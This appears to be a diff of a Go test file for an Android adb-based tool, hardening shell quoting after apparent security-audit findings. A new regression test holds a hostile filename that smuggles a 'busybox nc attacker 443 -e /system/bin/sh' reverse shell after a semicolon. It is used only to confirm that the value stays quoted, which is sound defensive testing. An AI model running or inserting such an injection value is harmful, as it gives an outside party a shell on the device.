@@ -4,6 +4,7 @@ import (
 	"context"
 	"io/fs"
 	"reflect"
+	"strings"
 	"testing"
 
 	"github.com/integrisec/MobFI/internal/device"
@@ -32,7 +33,7 @@ func TestADBExecBuildsShellCommand(t *testing.T) {
 	if string(out) != "uid=0" {
 		t.Errorf("out = %q", out)
 	}
-	want := []string{"adb", "-s", "SER", "shell", "id", "-u"}
+	want := []string{"adb", "-s", "SER", "shell", "'id' '-u'"}
 	if !reflect.DeepEqual(got, want) {
 		t.Errorf("args = %v, want %v", got, want)
 	}
@@ -45,20 +46,23 @@ func TestADBRunAsWrapsCommands(t *testing.T) {
 		return nil, nil
 	}}
 	a.Exec(context.Background(), "id", "-u")
-	want := []string{"adb", "-s", "SER", "shell", "run-as", "com.x", "id", "-u"}
+	want := []string{"adb", "-s", "SER", "shell", "'run-as' 'com.x' 'id' '-u'"}
 	if !reflect.DeepEqual(got, want) {
 		t.Errorf("run-as Exec args = %v, want %v", got, want)
 	}
 
 	a.find(context.Background(), "/data/data/com.x", "-type", "d")
-	wantFind := []string{"adb", "-s", "SER", "shell", "run-as", "com.x", "find", "/data/data/com.x", "-type", "d"}
+	wantFind := []string{"adb", "-s", "SER", "shell", "'run-as' 'com.x' 'find' '/data/data/com.x' '-type' 'd'"}
 	if !reflect.DeepEqual(got, wantFind) {
 		t.Errorf("run-as find args = %v, want %v", got, wantFind)
 	}
 }
 
-// In su mode the whole on-device command must be grouped and passed to adb as
-// a single argument, so adb does not re-split it and break `su -c`.
+// In su mode the on-device command runs as `su 0 <argv>` (not `su -c
+// 'joined'`) so su exec's the argv directly rather than shelling it a second
+// time; the whole string is single-quoted for the outer adb-shell so no
+// metacharacter in a device-supplied element executes on the way in. See
+// SECURITY-AUDIT.md finding MFI-CMD-01.
 func TestADBSuWrapsCommands(t *testing.T) {
 	var got []string
 	a := &adbConn{bin: "adb", serial: "SER", su: true, run: func(_ context.Context, name string, args ...string) ([]byte, error) {
@@ -66,16 +70,65 @@ func TestADBSuWrapsCommands(t *testing.T) {
 		return nil, nil
 	}}
 	a.Exec(context.Background(), "ls", "/data/data/com.x")
-	want := []string{"adb", "-s", "SER", "shell", "su -c 'ls /data/data/com.x'"}
+	want := []string{"adb", "-s", "SER", "shell", "'su' '0' 'ls' '/data/data/com.x'"}
 	if !reflect.DeepEqual(got, want) {
 		t.Errorf("su Exec args = %v, want %v", got, want)
 	}
 
 	a.find(context.Background(), "/data/data/com.x", "-type", "d")
-	wantFind := []string{"adb", "-s", "SER", "shell", "su -c 'find /data/data/com.x -type d'"}
+	wantFind := []string{"adb", "-s", "SER", "shell", "'su' '0' 'find' '/data/data/com.x' '-type' 'd'"}
 	if !reflect.DeepEqual(got, wantFind) {
 		t.Errorf("su find args = %v, want %v", got, wantFind)
 	}
+}
+
+// TestADBQuotesShellMetacharsInFilenames confirms that device-side names
+// carrying shell metacharacters ride through wrap() as literal argv data and
+// never surface as extra sh tokens. Guards MFI-CMD-01 and MFI-CMD-02.
+func TestADBQuotesShellMetacharsInFilenames(t *testing.T) {
+	// A filename crafted by a hostile app that would inject if any layer
+	// interpreted it as sh.
+	hostile := "/sdcard/foo; busybox nc attacker 443 -e /system/bin/sh #"
+
+	for _, mode := range []struct {
+		name string
+		a    *adbConn
+	}{
+		{"non-su", &adbConn{bin: "adb", serial: "SER"}},
+		{"run-as", &adbConn{bin: "adb", serial: "SER", asPackage: "com.x"}},
+		{"su", &adbConn{bin: "adb", serial: "SER", su: true}},
+	} {
+		got := mode.a.wrap("exec-out", "cat", hostile)
+		if len(got) < 4 {
+			t.Fatalf("%s: expected wrap to emit >=4 argv elements, got %v", mode.name, got)
+		}
+		last := got[len(got)-1]
+		// The command line handed to the outer adb-shell must be one string,
+		// with the hostile path fully enclosed in a single-quoted token, so
+		// the device sh sees `cat` + one argument, not two chained commands.
+		if !strings.Contains(last, "'"+hostile+"'") {
+			t.Errorf("%s: hostile path was not single-quoted for the device shell.\nargv[last] = %q", mode.name, last)
+		}
+		// And the metacharacters must not appear unquoted anywhere else --
+		// if wrap ever split them out of the quoted token they would be
+		// here.
+		for _, tok := range got[:len(got)-1] {
+			if strings.ContainsAny(tok, ";|`$") {
+				t.Errorf("%s: shell metachar leaked into argv element %q", mode.name, tok)
+			}
+		}
+	}
+}
+
+// TestQuoteArgvPanicsOnNUL guards the input contract of quoteArgv against
+// silent truncation by exec.
+func TestQuoteArgvPanicsOnNUL(t *testing.T) {
+	defer func() {
+		if r := recover(); r == nil {
+			t.Fatal("expected panic on NUL byte in argv")
+		}
+	}()
+	quoteArgv([]string{"cat", "/tmp/foo\x00/bar"})
 }
 
 const (
@@ -100,17 +153,18 @@ const (
 
 func walkConn() *adbConn {
 	return &adbConn{bin: "adb", serial: "SER", run: func(_ context.Context, _ string, args ...string) ([]byte, error) {
-		for i, a := range args {
-			if a == "-type" && i+1 < len(args) {
-				switch args[i+1] {
-				case "d":
-					return []byte(walkDirs), nil
-				case "f":
-					return []byte(walkFiles), nil
-				}
-			}
+		// wrap() emits the whole on-device command as one shell-quoted
+		// string in the final argv element, so the -type flag is embedded
+		// there rather than a separate positional arg.
+		last := args[len(args)-1]
+		switch {
+		case strings.Contains(last, "'-type' 'd'"):
+			return []byte(walkDirs), nil
+		case strings.Contains(last, "'-type' 'f'"):
+			return []byte(walkFiles), nil
+		default:
+			return []byte(walkAll), nil
 		}
-		return []byte(walkAll), nil
 	}}
 }
 
